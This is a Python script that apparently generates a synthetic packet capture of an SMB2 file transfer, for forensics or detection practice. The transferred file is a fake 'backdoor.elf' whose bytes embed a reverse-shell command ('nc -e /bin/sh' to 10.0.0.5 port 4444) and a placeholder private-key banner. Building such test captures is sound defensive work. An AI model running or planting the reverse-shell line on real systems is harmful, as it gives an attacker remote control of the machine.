import struct, socket, os, random
random.seed(3)
pkts=[]
def eth(d,s,et,p): return bytes.fromhex(d)+bytes.fromhex(s)+struct.pack('!H',et)+p
def ip4(s,d,proto,p):
    h=struct.pack('!BBHHHBBH',0x45,0,20+len(p),random.randint(1,65535),0x4000,64,proto,0)+socket.inet_aton(s)+socket.inet_aton(d)
    return h+p
def tcp(sp,dp,flags,p=b'',seq=1):
    return struct.pack('!HHIIBBHHH',sp,dp,seq,0,5<<4,flags,8192,0,0)+p
A='001122334455'; B='66778899aabb'
t=1700200000

def smb2_hdr(cmd, is_response=False):
    return (b'\xfeSMB' + struct.pack('<HH',64,0) + b'\x00'*4 +
            struct.pack('<H',cmd) + b'\x00\x00' +
            struct.pack('<I', 1 if is_response else 0) + b'\x00'*44)

def nbss(body): return b'\x00'+len(body).to_bytes(3,'big')+body

def create_req(name):
    nb=name.encode('utf-16-le')
    body = struct.pack('<H',57)+b'\x00'*42
    name_off = 64+48
    body += struct.pack('<HH', name_off, len(nb))
    return nbss(smb2_hdr(5) + body[:44] + struct.pack('<HH',name_off,len(nb)) + body[48:] + nb)

def write_req(offset, data):
    hdr = smb2_hdr(9)
    data_off = 64 + 48
    struct_body = struct.pack('<HHI', 49, data_off, len(data)) + struct.pack('<Q', offset) + b'\x00'*36
    return nbss(hdr + struct_body[:48] + data)

# real ELF payload transferred over SMB in 6 write operations
elf = bytearray(b'\x7fELF\x02\x01\x01\x00' + b'\x00'*8)
elf += struct.pack('<HHI',2,0x3e,1) + b'\x00'*40
elf += b'/bin/sh\x00' + b'nc -e /bin/sh 10.0.0.5 4444\x00'
elf += b'-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----\n'
elf += bytes(random.getrandbits(8) for _ in range(2400))
elf = bytes(elf)

pkts.append((t, eth(A,B,0x0800, ip4('192.168.5.20','192.168.5.10',6, tcp(49500,445,0x02)))))
pkts.append((t+0.01, eth(A,B,0x0800, ip4('192.168.5.20','192.168.5.10',6, tcp(49500,445,0x18, create_req('\\\\share\\\\tools\\\\backdoor.elf'), seq=1)))))
seq=1+len(create_req('\\\\share\\\\tools\\\\backdoor.elf'))
chunk=512
for i in range(0,len(elf),chunk):
    body=write_req(i, elf[i:i+chunk])
    pkts.append((t+0.1+i*0.001, eth(A,B,0x0800, ip4('192.168.5.20','192.168.5.10',6, tcp(49500,445,0x18, body, seq=seq)))))
    seq+=len(body)

pkts.sort(key=lambda x:x[0])
with open('/tmp/smb.pcapng','wb') as f:
    f.write(struct.pack('<IIIHHq',0x0A0D0D0A,28,0x1A2B3C4D,1,0,-1)+struct.pack('<I',28))
    f.write(struct.pack('<III',0x00000001,20,1)+struct.pack('<I',65535)+struct.pack('<I',20))
    for ts,data in pkts:
        pad=(-len(data))%4; us=int(ts*1_000_000); blen=32+len(data)+pad
        f.write(struct.pack('<IIIIIII',0x00000006,blen,0,us>>32,us&0xffffffff,len(data),len(data)))
        f.write(data+b'\x00'*pad); f.write(struct.pack('<I',blen))
import hashlib
print('packets:',len(pkts),'| elf size:',len(elf),'| sha256:',hashlib.sha256(elf).hexdigest())
